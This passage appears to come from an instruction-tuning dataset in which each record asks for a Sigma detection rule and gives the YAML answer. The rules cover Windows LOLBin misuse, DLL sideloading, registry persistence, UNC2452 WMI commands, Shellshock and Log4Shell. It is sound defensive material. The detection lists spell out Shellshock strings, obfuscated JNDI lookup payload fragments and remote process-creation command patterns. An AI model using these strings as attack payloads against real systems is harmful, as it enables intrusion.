    "instruction": "Build a Sigma rule with the goal of detecting The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect instances where the \"VSIISExeLauncher.exe\" binary, part of the Visual Studio/VS Code, is used to execute arbitrary binaries, you should monitor Windows process creation logs. Keep an eye out specifically for processes that are either named \"\\VSIISExeLauncher.exe\" at the end of the path or have the original file name \"VSIISExeLauncher.exe\". Additionally, it is important to scrutinize any command line parameters that include sequences such as \" -p \" and \" -a \", as these might indicate attempts at exploiting this executable for unauthorized binary launches. The rule applies across all cases where these conditions match, indicating a medium-level threat, although it's worth noting that there could be instances where these detections are not malicious (although such false positives are unspecified).",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSIISExeLauncher.exe'\n        - OriginalFileName: 'VSIISExeLauncher.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -p '\n            - ' -a '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VSIISExeLauncher.exe'\n        - OriginalFileName: 'VSIISExeLauncher.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -p '\n            - ' -a '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "The \"VSIISExeLauncher.exe\" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries",
      "answer": "In order to detect instances where the \"VSIISExeLauncher.exe\" binary, part of the Visual Studio/VS Code, is used to execute arbitrary binaries, you should monitor Windows process creation logs. Keep an eye out specifically for processes that are either named \"\\VSIISExeLauncher.exe\" at the end of the path or have the original file name \"VSIISExeLauncher.exe\". Additionally, it is important to scrutinize any command line parameters that include sequences such as \" -p \" and \" -a \", as these might indicate attempts at exploiting this executable for unauthorized binary launches. The rule applies across all cases where these conditions match, indicating a medium-level threat, although it's worth noting that there could be instances where these detections are not malicious (although such false positives are unspecified)."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor the process creation logs in Windows for instances where the VMware Xfer utility, known as VMwareXferlogs.exe, is executed. Specifically, focus on detecting when this executable is launched from locations other than its default directory, typically 'C:\\Program Files\\VMware\\'. This deviation from the norm could indicate an attempt at DLL sideloading, a technique where an attacker exploits the loading of dynamic link libraries to execute malicious code. The occurrence of VMwareXferlogs.exe running from any unusual path is a significant red flag, given that false positives are considered unlikely. The detection of this activity takes high importance due to the potential security implications associated with unauthorized DLL loading.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\VMwareXferlogs.exe'\n    filter: # VMware might be installed in another path so update the rule accordingly\n        Image|startswith: 'C:\\Program Files\\VMware\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\VMwareXferlogs.exe'\n    filter: # VMware might be installed in another path so update the rule accordingly\n        Image|startswith: 'C:\\Program Files\\VMware\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL",
      "answer": "In order to detect execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL, you should: Monitor the process creation logs in Windows for instances where the VMware Xfer utility, known as VMwareXferlogs.exe, is executed. Specifically, focus on detecting when this executable is launched from locations other than its default directory, typically 'C:\\Program Files\\VMware\\'. This deviation from the norm could indicate an attempt at DLL sideloading, a technique where an attacker exploits the loading of dynamic link libraries to execute malicious code. The occurrence of VMwareXferlogs.exe running from any unusual path is a significant red flag, given that false positives are considered unlikely. The detection of this activity takes high importance due to the potential security implications associated with unauthorized DLL loading."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of autostart extensibility point (ASEP) in registry..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification of autostart extensibility point (ASEP) in the registry, you should monitor for registry sets within Windows environments focusing on events where the `SetValue` type signifies a modification in registry keys. Specifically, lookout for changes made to the `SYSTEM\\CurrentControlSet\\Control` path or any alterations to critical system functionalities and security settings such as Terminal Server settings like `RDP-Tcp\\InitialProgram` and `StartupPrograms`, `SecurityProviders`, settings that affect safe boot operations like `AlternateShell`, configurations related to `Print` providers and monitors, adjustments in the network provider's order, and modifications in the Local Security Authority (LSA) pertaining to `Notification Packages` and `Authentication Packages`, as well as changes to the Boot Verification Program's image path.\n\nAdditionally, it's crucial to filter out events associated with known legitimate operations that could cause false positives. For instance, ignore modifications done by `C:\\Windows\\System32\\spoolsv.exe` specifically targeting `CutePDF Writer Monitor` linked to the `cpwmon64_v40.dll` or `CutePDF Writer`, adjustments through `C:\\Windows\\System32\\spoolsv.exe` focused on `Microsoft.Office.OneNote_` printer monitors by users with a name that contains 'AUTHORI' or 'AUTORI' indicative of different language settings, alterations related to network provider's order done by `C:\\Windows\\System32\\poqexec.exe`, and changes to printer monitors for `VNCpm.dll` via `C:\\Windows\\System32\\spoolsv.exe`.\n\nThis detailed monitoring and filtering ensure accurate detection while reducing noise from false positives such as the legitimate software installation or administrator's legitimate setup of autorun keys. This approach leverages knowledge about registry autostart extensibility points (ASEP) to fortify detection mechanisms against unauthorized modifications aiming to achieve persistence, execute malicious payloads at startup, or compromise system security settings. Pay attention to security events associated with modifying these registry keys, ensuring comprehensive coverage of potential attack vectors while excluding known legitimate behavior patterns to maintain operational efficiency and security integrity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    system_control_base:\n        EventType: SetValue\n        TargetObject|contains: '\\SYSTEM\\CurrentControlSet\\Control'\n    system_control_keys:\n        TargetObject|contains:\n            - '\\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram'\n            - '\\Terminal Server\\Wds\\rdpwd\\StartupPrograms'\n            - '\\SecurityProviders\\SecurityProviders'\n            - '\\SafeBoot\\AlternateShell'\n            - '\\Print\\Providers'\n            - '\\Print\\Monitors'\n            - '\\NetworkProvider\\Order'\n            - '\\Lsa\\Notification Packages'\n            - '\\Lsa\\Authentication Packages'\n            - '\\BootVerificationProgram\\ImagePath'\n    filter_empty:\n        Details: '(Empty)'\n    filter_cutepdf:\n        Image: 'C:\\Windows\\System32\\spoolsv.exe'\n        TargetObject|contains: '\\Print\\Monitors\\CutePDF Writer Monitor'\n        Details:\n            - 'cpwmon64_v40.dll'\n            - 'CutePDF Writer'\n    filter_onenote:\n        Image: C:\\Windows\\System32\\spoolsv.exe\n        TargetObject|contains: 'Print\\Monitors\\Appmon\\Ports\\Microsoft.Office.OneNote_'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    filter_poqexec:\n        Image: 'C:\\Windows\\System32\\poqexec.exe'\n        TargetObject|endswith: '\\NetworkProvider\\Order\\ProviderOrder'\n    filter_realvnc:\n        Image: 'C:\\Windows\\System32\\spoolsv.exe'\n        TargetObject|endswith: '\\Print\\Monitors\\MONVNC\\Driver'\n        Details: 'VNCpm.dll'\n    condition: all of system_control_* and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    system_control_base:\n        EventType: SetValue\n        TargetObject|contains: '\\SYSTEM\\CurrentControlSet\\Control'\n    system_control_keys:\n        TargetObject|contains:\n            - '\\Terminal Server\\WinStations\\RDP-Tcp\\InitialProgram'\n            - '\\Terminal Server\\Wds\\rdpwd\\StartupPrograms'\n            - '\\SecurityProviders\\SecurityProviders'\n            - '\\SafeBoot\\AlternateShell'\n            - '\\Print\\Providers'\n            - '\\Print\\Monitors'\n            - '\\NetworkProvider\\Order'\n            - '\\Lsa\\Notification Packages'\n            - '\\Lsa\\Authentication Packages'\n            - '\\BootVerificationProgram\\ImagePath'\n    filter_empty:\n        Details: '(Empty)'\n    filter_cutepdf:\n        Image: 'C:\\Windows\\System32\\spoolsv.exe'\n        TargetObject|contains: '\\Print\\Monitors\\CutePDF Writer Monitor'\n        Details:\n            - 'cpwmon64_v40.dll'\n            - 'CutePDF Writer'\n    filter_onenote:\n        Image: C:\\Windows\\System32\\spoolsv.exe\n        TargetObject|contains: 'Print\\Monitors\\Appmon\\Ports\\Microsoft.Office.OneNote_'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    filter_poqexec:\n        Image: 'C:\\Windows\\System32\\poqexec.exe'\n        TargetObject|endswith: '\\NetworkProvider\\Order\\ProviderOrder'\n    filter_realvnc:\n        Image: 'C:\\Windows\\System32\\spoolsv.exe'\n        TargetObject|endswith: '\\Print\\Monitors\\MONVNC\\Driver'\n        Details: 'VNCpm.dll'\n    condition: all of system_control_* and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
      "question": "modification of autostart extensibility point (ASEP) in registry.",
      "answer": "In order to detect modification of autostart extensibility point (ASEP) in the registry, you should monitor for registry sets within Windows environments focusing on events where the `SetValue` type signifies a modification in registry keys. Specifically, lookout for changes made to the `SYSTEM\\CurrentControlSet\\Control` path or any alterations to critical system functionalities and security settings such as Terminal Server settings like `RDP-Tcp\\InitialProgram` and `StartupPrograms`, `SecurityProviders`, settings that affect safe boot operations like `AlternateShell`, configurations related to `Print` providers and monitors, adjustments in the network provider's order, and modifications in the Local Security Authority (LSA) pertaining to `Notification Packages` and `Authentication Packages`, as well as changes to the Boot Verification Program's image path.\n\nAdditionally, it's crucial to filter out events associated with known legitimate operations that could cause false positives. For instance, ignore modifications done by `C:\\Windows\\System32\\spoolsv.exe` specifically targeting `CutePDF Writer Monitor` linked to the `cpwmon64_v40.dll` or `CutePDF Writer`, adjustments through `C:\\Windows\\System32\\spoolsv.exe` focused on `Microsoft.Office.OneNote_` printer monitors by users with a name that contains 'AUTHORI' or 'AUTORI' indicative of different language settings, alterations related to network provider's order done by `C:\\Windows\\System32\\poqexec.exe`, and changes to printer monitors for `VNCpm.dll` via `C:\\Windows\\System32\\spoolsv.exe`.\n\nThis detailed monitoring and filtering ensure accurate detection while reducing noise from false positives such as the legitimate software installation or administrator's legitimate setup of autorun keys. This approach leverages knowledge about registry autostart extensibility points (ASEP) to fortify detection mechanisms against unauthorized modifications aiming to achieve persistence, execute malicious payloads at startup, or compromise system security settings. Pay attention to security events associated with modifying these registry keys, ensuring comprehensive coverage of potential attack vectors while excluding known legitimate behavior patterns to maintain operational efficiency and security integrity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports, you should: Monitor for the creation of processes on Windows systems, specifically looking for command line patterns that indicate the execution of sophisticated commands. These include patterns where PowerShell is used to invoke a WMI method for process creation, evidenced by commands that contain phrases like 'Invoke-WMIMethod win32_process -name create -argumentlist', combined with 'rundll32 c:\\windows'. Additionally, watch for uses of WMIC to remotely create processes, signaled by the presence of 'wmic /node:' followed closely by 'process call create \"rundll32 c:\\windows'. Such command patterns are critical indicators of the tactics, techniques, and procedures associated with the UNC2452 actors, highlighting potential malicious activity likely not related to regular, day-to-day operations of Windows-based environments. Detected occurrences should be treated with a high level of scrutiny due to the unlikely nature of false positives at this critical level of detection. This approach focuses on identifying potential breaches or misuse aligned with techniques that correspond to initial access, execution, and persistence, thus aiding in the timely mitigation of threats associated with these sophisticated adversary tactics.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'Invoke-WMIMethod win32_process -name create -argumentlist'\n            - 'rundll32 c:\\windows'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic /node:'\n            - 'process call create \"rundll32 c:\\windows'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'Invoke-WMIMethod win32_process -name create -argumentlist'\n            - 'rundll32 c:\\windows'\n    selection_cli_2:\n        CommandLine|contains|all:\n            - 'wmic /node:'\n            - 'process call create \"rundll32 c:\\windows'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports",
      "answer": "In order to detect a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports, you should: Monitor for the creation of processes on Windows systems, specifically looking for command line patterns that indicate the execution of sophisticated commands. These include patterns where PowerShell is used to invoke a WMI method for process creation, evidenced by commands that contain phrases like 'Invoke-WMIMethod win32_process -name create -argumentlist', combined with 'rundll32 c:\\windows'. Additionally, watch for uses of WMIC to remotely create processes, signaled by the presence of 'wmic /node:' followed closely by 'process call create \"rundll32 c:\\windows'. Such command patterns are critical indicators of the tactics, techniques, and procedures associated with the UNC2452 actors, highlighting potential malicious activity likely not related to regular, day-to-day operations of Windows-based environments. Detected occurrences should be treated with a high level of scrutiny due to the unlikely nature of false positives at this critical level of detection. This approach focuses on identifying potential breaches or misuse aligned with techniques that correspond to initial access, execution, and persistence, thus aiding in the timely mitigation of threats associated with these sophisticated adversary tactics."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling Windows Defender Exploit Guard Network Protection.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling Windows Defender Exploit Guard Network Protection, you should: Monitor Windows registry modification events specifically targeted at altering the settings of Windows Defender's Exploit Guard feature. This is achieved by observing registry events categorized under registry settings modifications on a Windows operating system product. Focus on events where the \u2018SetValue\u2019 type action is taken, indicating a modification of registry values. Specifically, identify instances where the \u2018TargetObject\u2019 path includes \u2018SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\DisallowExploitProtectionOverride\u2019. This path represents an attempt to override or disable the Exploit Protection settings in Windows Defender Security Center. The key detail to look out for in these modifications is the setting of a 'DWORD (00000001)' value. This value typically signifies an enablement of the policy, in this context suggesting the disabling of exploit protection override capabilities, effectively weakening the system's defense. It's crucial to monitor and investigate such modifications, although it's worth noting that there might be unknown legitimate scenarios leading to such changes, categorizing them as potential false positives. The threat level associated with this activity is considered medium, suggesting a need for caution and further investigation upon detection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\DisallowExploitProtectionOverride'\n        Details: 'DWORD (00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\DisallowExploitProtectionOverride'\n        Details: 'DWORD (00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "disabling Windows Defender Exploit Guard Network Protection",
      "answer": "In order to detect disabling Windows Defender Exploit Guard Network Protection, you should: Monitor Windows registry modification events specifically targeted at altering the settings of Windows Defender's Exploit Guard feature. This is achieved by observing registry events categorized under registry settings modifications on a Windows operating system product. Focus on events where the \u2018SetValue\u2019 type action is taken, indicating a modification of registry values. Specifically, identify instances where the \u2018TargetObject\u2019 path includes \u2018SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\DisallowExploitProtectionOverride\u2019. This path represents an attempt to override or disable the Exploit Protection settings in Windows Defender Security Center. The key detail to look out for in these modifications is the setting of a 'DWORD (00000001)' value. This value typically signifies an enablement of the policy, in this context suggesting the disabling of exploit protection override capabilities, effectively weakening the system's defense. It's crucial to monitor and investigate such modifications, although it's worth noting that there might be unknown legitimate scenarios leading to such changes, categorizing them as potential false positives. The threat level associated with this activity is considered medium, suggesting a need for caution and further investigation upon detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting shellshock expressions in log files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect shellshock expressions in log files, you should monitor log files generated by Linux systems for specific patterns that indicate a shellshock attack. These patterns are unique sequences of characters that exploit the shellshock vulnerability, specifically:\n\n- '(){:;};'\n- '() {:;};'\n- '() { :;};'\n- '() { :; };'\n\nThese expressions are indicative of attempts to exploit the shellshock vulnerability, which allows attackers to execute arbitrary commands on the affected system. Monitoring for these expressions in logs will help identify potential shellshock attack attempts. It is important to note that there may be unknown false positives, indicating situations where these patterns might be logged without malicious intent. The severity level of detecting these patterns is considered high due to the potential impact of shellshock exploits.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        - '(){:;};'\n        - '() {:;};'\n        - '() { :;};'\n        - '() { :; };'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        - '(){:;};'\n        - '() {:;};'\n        - '() { :;};'\n        - '() { :; };'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "shellshock expressions in log files",
      "answer": "In order to detect shellshock expressions in log files, you should monitor log files generated by Linux systems for specific patterns that indicate a shellshock attack. These patterns are unique sequences of characters that exploit the shellshock vulnerability, specifically:\n\n- '(){:;};'\n- '() {:;};'\n- '() { :;};'\n- '() { :; };'\n\nThese expressions are indicative of attempts to exploit the shellshock vulnerability, which allows attackers to execute arbitrary commands on the affected system. Monitoring for these expressions in logs will help identify potential shellshock attack attempts. It is important to note that there may be unknown false positives, indicating situations where these patterns might be logged without malicious intent. The severity level of detecting these patterns is considered high due to the potential impact of shellshock exploits."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting failed installation of a Exchange Transport Agent.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a failed installation of an Exchange Transport Agent, you should monitor the Microsoft Exchange Management service on Windows systems. Focus on identifying specific event logs that record EventID 6 in conjunction with data containing the term 'Install-TransportAgent'. This combination of factors points to an attempt to install a Transport Agent, which is a component used to extend the capabilities of the Exchange server's transport rules. \n\nIt's essential to review the 'AssemblyPath' field within these event logs, as it provides crucial details regarding the installation's context. This information can help differentiate between legitimate attempts to install TransportAgents and potentially malicious activities. However, be aware that legitimate installations of exchange TransportAgents also trigger these logs, and the 'AssemblyPath' can serve as a good indicator to distinguish such benign activities from suspicious ones. \n\nGiven the nature of this detection, it falls under a high severity level due to the potential implications of unauthorized or failed Transport Agent installations, which could impact mail flow or introduce vulnerabilities within the Exchange environment. \n\nTherefore, keeping a vigilant eye on logs tagged with these specific criteria can aid in identifying potentially compromised or misconfigured installations, aligning with the overall cybersecurity strategy to protect exchange servers from misuse or attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: msexchange-management\n    product: windows\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        EventID: 6\n        Data|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: msexchange-management\n    product: windows\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        EventID: 6\n        Data|contains: 'Install-TransportAgent'\n    condition: selection\nfields:\n    - AssemblyPath\nfalsepositives:\n    - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this.\nlevel: high\n",
      "question": "failed installation of a Exchange Transport Agent",
      "answer": "In order to detect a failed installation of an Exchange Transport Agent, you should monitor the Microsoft Exchange Management service on Windows systems. Focus on identifying specific event logs that record EventID 6 in conjunction with data containing the term 'Install-TransportAgent'. This combination of factors points to an attempt to install a Transport Agent, which is a component used to extend the capabilities of the Exchange server's transport rules. \n\nIt's essential to review the 'AssemblyPath' field within these event logs, as it provides crucial details regarding the installation's context. This information can help differentiate between legitimate attempts to install TransportAgents and potentially malicious activities. However, be aware that legitimate installations of exchange TransportAgents also trigger these logs, and the 'AssemblyPath' can serve as a good indicator to distinguish such benign activities from suspicious ones. \n\nGiven the nature of this detection, it falls under a high severity level due to the potential implications of unauthorized or failed Transport Agent installations, which could impact mail flow or introduce vulnerabilities within the Exchange environment. \n\nTherefore, keeping a vigilant eye on logs tagged with these specific criteria can aid in identifying potentially compromised or misconfigured installations, aligning with the overall cybersecurity strategy to protect exchange servers from misuse or attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts against the log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell), you should monitor web server log entries for specific patterns that indicate an attack attempt. Focus should be on the 'User-Agent', 'URI Query', and 'Referer' header fields of web traffic. These fields are commonly abused by attackers to deliver malicious payloads exploiting the Log4Shell vulnerability. \n\nLook out for the presence of certain key patterns within these fields, which include variations of the JNDI lookup strings such as '${jndi:ldap:/', '${jndi:rmi:/', and others that involve encoded versions of these strings or manipulations aimed at evading simple detection mechanisms (e.g., '${base64:JHtqbmRp', '${${env:BARFOO:-j}', and '${${lower:j}ndi:'). Also, signs of obfuscation like strings containing encoded '${jndi:' and other crafted entries indicating attempts to leverage the Log4Shell vulnerability should be carefully examined.\n\nIt's important to adjust monitoring tools to detect these specific patterns in the 'User-Agent', 'URI Query', and 'Referer' fields to promptly identify and respond to potential exploitation attempts. However, be mindful of possible false positives, such as those that might arise from vulnerability scanning activities, and adjust the detection mechanisms accordingly. The level of threat associated with these detection patterns is considered high, underscoring the necessity of implementing these measures to secure web servers against this critical vulnerability.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-user-agent|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    # selection2:\n        # user-agent|contains:\n            # - '${jndi:ldap:/'\n            # - '${jndi:rmi:/'\n            # - '${jndi:ldaps:/'\n            # - '${jndi:dns:/'\n            # - '/$%7bjndi:'\n            # - '%24%7bjndi:'\n            # - '$%7Bjndi:'\n            # - '%2524%257Bjndi'\n            # - '%2F%252524%25257Bjndi%3A'\n            # - '${jndi:${lower:'\n            # - '${::-j}${'\n            # - '${jndi:nis'\n            # - '${jndi:nds'\n            # - '${jndi:corba'\n            # - '${jndi:iiop'\n            # - 'Reference Class Name: foo'\n            # - '${${env:BARFOO:-j}'\n            # - '${::-l}${::-d}${::-a}${::-p}'\n            # - '${base64:JHtqbmRp'\n            # - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            # - '${${lower:j}ndi:'\n            # - '${${upper:j}ndi:'\n            # - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection3:\n        cs-uri-query|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection4:\n        cs-referer|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    condition: 1 of selection*\nfalsepositives:\n    - Vulnerability scanning\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-user-agent|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    # selection2:\n        # user-agent|contains:\n            # - '${jndi:ldap:/'\n            # - '${jndi:rmi:/'\n            # - '${jndi:ldaps:/'\n            # - '${jndi:dns:/'\n            # - '/$%7bjndi:'\n            # - '%24%7bjndi:'\n            # - '$%7Bjndi:'\n            # - '%2524%257Bjndi'\n            # - '%2F%252524%25257Bjndi%3A'\n            # - '${jndi:${lower:'\n            # - '${::-j}${'\n            # - '${jndi:nis'\n            # - '${jndi:nds'\n            # - '${jndi:corba'\n            # - '${jndi:iiop'\n            # - 'Reference Class Name: foo'\n            # - '${${env:BARFOO:-j}'\n            # - '${::-l}${::-d}${::-a}${::-p}'\n            # - '${base64:JHtqbmRp'\n            # - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            # - '${${lower:j}ndi:'\n            # - '${${upper:j}ndi:'\n            # - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection3:\n        cs-uri-query|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - 